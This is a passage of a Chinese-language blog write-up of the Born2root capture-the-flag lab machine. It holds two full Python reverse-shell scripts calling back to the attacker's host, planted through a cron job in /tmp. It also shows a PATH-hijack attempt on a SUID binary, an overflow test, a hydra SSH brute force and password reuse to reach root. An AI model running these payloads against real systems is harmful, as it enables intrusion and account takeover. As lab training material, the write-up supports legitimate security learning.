.profile<br>128338 drwxr-xr-x 2 root   root   4,0K juin   7  2017 .ssh<br></code></pre></td></tr></table></figure>
+
+<p>显示要输入密码，我下意识 ctrl+c 结果直接报错了，看起来是 python 写的脚本在登录的时候自动触发，不过看起来用处不是很大</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@debian:~$ <span class="hljs-built_in">cat</span> .bash_history <br>nano /var/tmp/login.py<br>nano .bashrc<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span> -ah<br>sudo su<br><span class="hljs-built_in">exit</span><br>nano /var/tmp/login.py<br>clear<br>nano /var/tmp/login.py<br>su root<br><span class="hljs-built_in">ls</span><br>su root<br>clear<br>su root<br>clear<br><span class="hljs-built_in">cd</span> /var/www/html/icons/<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">mv</span> VdXAsOKisAOIO.txt.png key.txt.png<br>su root<br>su roo<br>su root<br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">ls</span><br>su root<br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">logout</span><br></code></pre></td></tr></table></figure>
+
+<p><code>/var/tmp/login.py</code> 查看查看这个文件的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@debian:~$ <span class="hljs-built_in">ls</span> -laih /var/tmp/login.py<br>55 -r-x------ 1 martin martin 263 juin   8  2017 /var/tmp/login.py<br>martin@debian:~$ <span class="hljs-built_in">cat</span> /var/tmp/login.py<br><span class="hljs-comment">#!/usr/bin/python</span><br><br>import os<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;READY TO ACCESS THE SECRET LAB ? &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>password = raw_input(<span class="hljs-string">&quot;secret password : &quot;</span>)<br><br><span class="hljs-keyword">if</span> (password) == <span class="hljs-string">&quot;secretsec&quot;</span> or <span class="hljs-string">&quot;secretlab&quot;</span> :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WELCOME ! &quot;</span>)<br><span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GET OUT ! &quot;</span>)<br>        os.system(<span class="hljs-string">&quot;pkill -u &#x27;martin&#x27;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>脚本看起来有点废，尤其是中间的判断语句 <code>if (password) == &quot;secretsec&quot; or &quot;secretlab&quot;</code> 这样的话不就肯定是 true 了，用户无论输入什么都能进入</p>
+<p>而且权限也不让人很在意，脚本中的两个口令先收集起来，或许可以用来碰撞，尝试 su 命令使用上面两个口令作为密码。但是均失败了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@debian:/home$ <span class="hljs-built_in">ls</span> -laih<br>total 20K<br>128262 drwxr-xr-x  5 root   root   4,0K juin   9  2017 .<br>     2 drwxr-xr-x 21 root   root   4,0K avril 26  2017 ..<br>141088 drwxr-xr-x  3 hadi   hadi   4,0K juin   5  2017 hadi<br>141985 drwx------  2 jimmy  jimmy  4,0K juin   9  2017 jimmy<br>128334 drwxr-xr-x  3 martin martin 4,0K juin   8  2017 martin<br></code></pre></td></tr></table></figure>
+
+<p>home 目录中存在三个用户，只有 hadi 可以进去查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@debian:/home/hadi$ <span class="hljs-built_in">ls</span> -alih<br>total 60K<br>141088 drwxr-xr-x 3 hadi hadi 4,0K juin   5  2017 .<br>128262 drwxr-xr-x 5 root root 4,0K juin   9  2017 ..<br>141089 -rw-r--r-- 1 hadi hadi  220 avril 26  2017 .bash_logout<br>141091 -rw-r--r-- 1 hadi hadi 3,5K avril 26  2017 .bashrc<br>128327 -rwxr-xr-x 1 root root 5,3K mai   10  2017 buff<br>141549 -rw-r--r-- 1 root root 1,1K mai   10  2017 buff.c<br>128332 -rw-r--r-- 1 root root  148 juin   5  2017 example.c<br>128329 -rw------- 1 root root 2,1K juin   5  2017 .gdb_history<br>128340 -rwxr-xr-x 1 root root 5,9K juin   5  2017 overflow<br>128328 -rw-r--r-- 1 root root   19 mai   10  2017 peda-session-buff.txt<br>128333 -rw-r--r-- 1 root root    5 juin   5  2017 peda-session-overflow.txt<br>141090 -rw-r--r-- 1 hadi hadi  675 avril 26  2017 .profile<br>141097 drwxr-xr-x 2 hadi hadi 4,0K mai    1  2017 .ssh<br></code></pre></td></tr></table></figure>
+
+<p>缓冲区溢出的漏洞？不过这权限也不是 SUID 啊，看不懂了，不过顺便补一补 Linux 上调试缓冲区溢出的知识。</p>
+<p><a target="_blank" rel="noopener" href="https://ravi5hanka.medium.com/privilege-escalation-in-linux-via-a-local-buffer-overflow-dcee4f9b4a49">Privilege Escalation in Linux via a Local Buffer Overflow | by Ravishanka Silva | Medium</a></p>
+<p>当输入为 260 个 A 时的内存区</p>
+<p><img src="/pic/376b981e22b04dd754bc9ec20a360761_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>框出来的是，经过测试发现指针的指向</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting program: /home/hadi/overflow $(python2 -c <span class="hljs-string">&#x27;print &quot;A&quot;* 236 +&quot;B&quot;*24&#x27;</span>)<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBB<br><br>Program received signal SIGSEGV, Segmentation fault.<br>0x42424242 <span class="hljs-keyword">in</span> ?? ()<br></code></pre></td></tr></table></figure>
+
+<p>仅作简单记录，实际上这个程序漏洞无法用来提权</p>
+<h2 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h2><p>接下来我看了敏感文件的权限和网站目录下的文件夹，以及定时任务和 SUID</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@debian:/home/hadi$ <span class="hljs-built_in">cat</span> /etc/crontab <br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br>*/5   * * * *   jimmy   python /tmp/sekurity.py<br></code></pre></td></tr></table></figure>
+
+<p>jimmy 用户的定时任务每五分钟运行一次，不过 tmp 目录下是每次开关机都清空的，所以这里我们可以自己创建一个反弹 shell 的同名 python 文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Set the host and the port.                                                                                        </span><br>HOST = <span class="hljs-string">&quot;192.168.56.106&quot;</span>                                                                                             <br>PORT = <span class="hljs-number">443</span>                                                                                                          <br>                                                                                                                    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params">(<span class="hljs-params">host, port</span>)</span>):<br>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        s.connect((host, port))<br>        <span class="hljs-keyword">return</span> s<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wait_for_command</span>(<span class="hljs-params">s</span>):<br>        data = s.recv(<span class="hljs-number">1024</span>)<br>        <span class="hljs-keyword">if</span> data == <span class="hljs-string">&quot;quit\n&quot;</span>:<br>                s.close()<br>                sys.exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-comment"># the socket died</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(data)==<span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># do shell command</span><br>                proc = subprocess.Popen(data, shell=<span class="hljs-literal">True</span>,<br>                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,<br>                        stdin=subprocess.PIPE)<br>                stdout_value = proc.stdout.read() + proc.stderr.read()<br>                s.send(stdout_value)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                socket_died=<span class="hljs-literal">False</span><br>                <span class="hljs-keyword">try</span>:<br>                        s=connect((HOST,PORT))<br>                        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> socket_died:<br>                                socket_died=wait_for_command(s)<br>                        s.close()<br>                <span class="hljs-keyword">except</span> socket.error:<br>                        <span class="hljs-keyword">pass</span><br>                time.sleep(<span class="hljs-number">5</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>        <span class="hljs-keyword">import</span> sys,os,subprocess,socket,time<br>        sys.exit(main())<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@debian:/tmp$ vi x.py <br>martin@debian:/tmp$ <span class="hljs-built_in">chmod</span> +x x.py<br><span class="hljs-comment"># 直接执行测试了一下能不能反弹shell，确认没问题了再修改为同名文件</span><br>martin@debian:/tmp$ <span class="hljs-built_in">mv</span> x.py sekurity.py<br></code></pre></td></tr></table></figure>
+
+<p>不过反弹的 shell 因为是 sh 环境，想使用 python 完善 shell 的时候会卡死</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.135] 36957<br><span class="hljs-built_in">whoami</span><br>jimmy<br><span class="hljs-built_in">id</span><br>uid=1002(jimmy) gid=1002(jimmy) groupes=1002(jimmy)<br><span class="hljs-built_in">ls</span><br>networker<br><span class="hljs-built_in">pwd</span><br>/home/jimmy<br><span class="hljs-built_in">ls</span> -liah<br>total 32K<br>141985 drwx------ 2 jimmy jimmy 4,0K juin   9  2017 .<br>128262 drwxr-xr-x 5 root  root  4,0K juin   9  2017 ..<br>141984 -rw-r--r-- 1 root  root    16 juin   9  2017 .bash_history<br>141986 -rw-r--r-- 1 jimmy jimmy  220 juin   8  2017 .bash_logout<br>141988 -rw-r--r-- 1 jimmy jimmy 3,5K juin   8  2017 .bashrc<br>141996 -rwsrwxrwx 1 root  root  7,4K juin   9  2017 networker<br>141987 -rw-r--r-- 1 jimmy jimmy  675 juin   8  2017 .profile<br><span class="hljs-built_in">cat</span> .bash_history<br>wget localhost<br></code></pre></td></tr></table></figure>
+
+<p>networker 是有 SUID 的，strings 查看后发现只有 echo 不是绝对路径，但是这个有问题的 shell 无法修改 PATH，尝试换一个反弹 shell 的 python 文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> dup2<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call<br><span class="hljs-keyword">import</span> socket<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&quot;192.168.56.106&quot;</span>,<span class="hljs-number">443</span>)) <br>dup2(s.fileno(),<span class="hljs-number">0</span>) <br>dup2(s.fileno(),<span class="hljs-number">1</span>) <br>dup2(s.fileno(),<span class="hljs-number">2</span>) <br>call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">jimmy@debian:~$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span><br>/bin/sh<br>jimmy@debian:~$ <span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br>jimmy@debian:~$ <span class="hljs-built_in">export</span><br><span class="hljs-built_in">export</span><br><span class="hljs-built_in">declare</span> -x HOME=<span class="hljs-string">&quot;/home/jimmy&quot;</span><br><span class="hljs-built_in">declare</span> -x LANG=<span class="hljs-string">&quot;fr_FR.UTF-8&quot;</span><br><span class="hljs-built_in">declare</span> -x LOGNAME=<span class="hljs-string">&quot;jimmy&quot;</span><br><span class="hljs-built_in">declare</span> -x LS_COLORS=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">declare</span> -x OLDPWD<br><span class="hljs-built_in">declare</span> -x PATH=<span class="hljs-string">&quot;.:/home/jimmy:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin&quot;</span><br><span class="hljs-built_in">declare</span> -x PWD=<span class="hljs-string">&quot;/home/jimmy&quot;</span><br><span class="hljs-built_in">declare</span> -x SHELL=<span class="hljs-string">&quot;/bin/sh&quot;</span><br><span class="hljs-built_in">declare</span> -x SHLVL=<span class="hljs-string">&quot;1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功写入了 PATH 之中，尝试将偷天换日</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">jimmy@debian:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt;<span class="hljs-built_in">echo</span>    <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt;<span class="hljs-built_in">echo</span><br>jimmy@debian:~$ <span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">echo</span><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">echo</span><br></code></pre></td></tr></table></figure>
+
+<p>不过搞完发现并没有成功，看起来 echo 命令似乎并不受环境变量的影响。</p>
+<p><img src="/pic/b464495be96112fd829e5aff215607b2_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>好吧，确实忘了内建命令这件事，接下来又尝试了 SUID、信息收集</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">jimmy@debian:~$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br> 20871   96 -rwsr-xr-x   1 root     root        96760 août 13  2014 /sbin/mount.nfs<br>  3589   28 -rwsr-xr-x   1 root     root        26344 mars 30  2015 /bin/umount<br>  3588   36 -rwsr-xr-x   1 root     root        34684 mars 30  2015 /bin/mount<br> 13038   40 -rwsr-xr-x   1 root     root        38868 févr. 24  2017 /bin/su<br>141996    8 -rwsrwxrwx   1 root     root         7496 juin  9  2017 /home/jimmy/networker<br> 20118 1060 -rwsr-xr-x   1 root     root      1085300 janv.  7  2017 /usr/sbin/exim4<br> 20945   96 -rwsr-sr-x   1 root     mail        96192 févr. 11  2015 /usr/bin/procmail<br> 11741   44 -rwsr-xr-x   1 root     root        43576 févr. 24  2017 /usr/bin/chsh<br> 11740   52 -rwsr-xr-x   1 root     root        52344 févr. 24  2017 /usr/bin/chfn<br> 11743   80 -rwsr-xr-x   1 root     root        78072 févr. 24  2017 /usr/bin/gpasswd<br> 11744   52 -rwsr-xr-x   1 root     root        53112 févr. 24  2017 /usr/bin/passwd<br> 19869   52 -rwsr-sr-x   1 daemon   daemon      50644 sept. 30  2014 /usr/bin/at<br> 13045   40 -rwsr-xr-x   1 root     root        38740 févr. 24  2017 /usr/bin/newgrp<br> 20914  552 -rwsr-xr-x   1 root     root       562536 juil. 22  2016 /usr/lib/openssh/ssh-keysign<br> 20200  356 -rwsr-xr--   1 root     messagebus   362672 nov. 22  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>  2048   12 -rwsr-xr-x   1 root     root         9468 mars 28  2017 /usr/lib/eject/dmcrypt-get-device<br></code></pre></td></tr></table></figure>
+
+<p>不过都失败了。有点郁闷，使用 linpeas 来辅助收集信息吧，但却发现 wget, curl,gcc 等命令都被限制了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jimmy@debian:~$ wget<br>wget<br> HAHA ... Nope<br></code></pre></td></tr></table></figure>
+
+<p>不像是 rbash ，可能是作者对某些系统调用进行了 hook </p>
+<p>只好使用 scp 上传文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ scp -o PubkeyAcceptedKeyTypes=ssh-rsa -i privatekey /home/kali/tools/internal\ information/linpeas.sh martin@192.168.56.135:/tmp<br>linpeas.sh<br></code></pre></td></tr></table></figure>
+
+<p>但是 linpeas 中看了一圈也没找到什么思路，加上 gcc 又无法使用，黔驴技穷了。</p>
+<h2 id="ssh-密码爆破"><a href="#ssh-密码爆破" class="headerlink" title="ssh 密码爆破"></a>ssh 密码爆破</h2><p>看了看 WP，没想到是如此的简单粗暴（因为有切换用户的操作，我一直觉得新获得的用户在某些方面有特殊权限或者能读取特殊文件，但没想到直接爆破了）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ <span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep hadi &gt;hadipasswd<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo hydra -l hadi -P hadipasswd 192.168.56.135 ssh <br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-19 12:30:49<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 1581 login tries (l:1/p:1581), ~99 tries per task<br>[DATA] attacking ssh://192.168.56.135:22/<br>[STATUS] 166.00 tries/min, 166 tries <span class="hljs-keyword">in</span> 00:01h, 1416 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:09h, 15 active<br>[22][ssh] host: 192.168.56.135   login: hadi   password: hadi123<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 3 final worker threads did not complete <span class="hljs-keyword">until</span> end.<br>[ERROR] 3 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-19 12:32:27<br></code></pre></td></tr></table></figure>
+
+<p>不过也学了一手，爆破使用的密码是从 rockyou.txt 中取用的和用户名有相同部分的密码，此外还可以使用 <code>cupp -i</code> 命令来根据用户信息生成字典。</p>
+<h2 id="密码重用"><a href="#密码重用" class="headerlink" title="密码重用"></a>密码重用</h2><p>最后尝试使用这个密码来 su 切换到 root 用户，成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">hadi@debian:/home$ su<br>Mot de passe : <br>root@debian:/home<span class="hljs-comment"># cd /root</span><br>root@debian:~<span class="hljs-comment"># ls</span><br>flag.txt<br>root@debian:~<span class="hljs-comment"># cat flag.txt </span><br>                                                                      <br>,-----.                         ,---. ,------.                 ,--.   <br>|  |) /_  ,---. ,--.--.,--,--, <span class="hljs-string">&#x27;.-.  \|  .--. &#x27;</span> ,---.  ,---. ,-<span class="hljs-string">&#x27;  &#x27;</span>-. <br>|  .-.  \| .-. ||  .--<span class="hljs-string">&#x27;|      \ .-&#x27;</span> .<span class="hljs-string">&#x27;|  &#x27;</span>--<span class="hljs-string">&#x27;.&#x27;</span>| .-. || .-. |<span class="hljs-string">&#x27;-.  .-&#x27;</span> <br>|  <span class="hljs-string">&#x27;--&#x27;</span> /<span class="hljs-string">&#x27; &#x27;</span>-<span class="hljs-string">&#x27; &#x27;</span>|  |   |  ||  |/   <span class="hljs-string">&#x27;-.|  |\  \ &#x27;</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-string">&#x27;  |  |   </span><br><span class="hljs-string">`------&#x27;</span>  `---<span class="hljs-string">&#x27; `--&#x27;</span>   `--<span class="hljs-string">&#x27;&#x27;</span>--<span class="hljs-string">&#x27;&#x27;</span>-----<span class="hljs-string">&#x27;`--&#x27;</span> <span class="hljs-string">&#x27;--&#x27;</span> `---<span class="hljs-string">&#x27;  `---&#x27;</span>   `--<span class="hljs-string">&#x27;   </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Congratulations ! you  pwned completly Born2root&#x27;</span>s CTF .<br><br>I hope you enjoyed it and you have made Tea<span class="hljs-string">&#x27;s overdose or coffee&#x27;</span>s overdose :p <br><br>I have blocked some easy ways to complete the CTF ( Kernel Exploit ... ) <span class="hljs-keyword">for</span> give you more fun and more knownledge ...<br><br>Pwning the box with a linux binary misconfiguration is more fun than with a Kernel Exploit !<br><br>Enumeration is The Key .<br><br><br><br>Give me feedback :[FB] Hadi Mene<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Born2root 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/08/f7491954730f.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
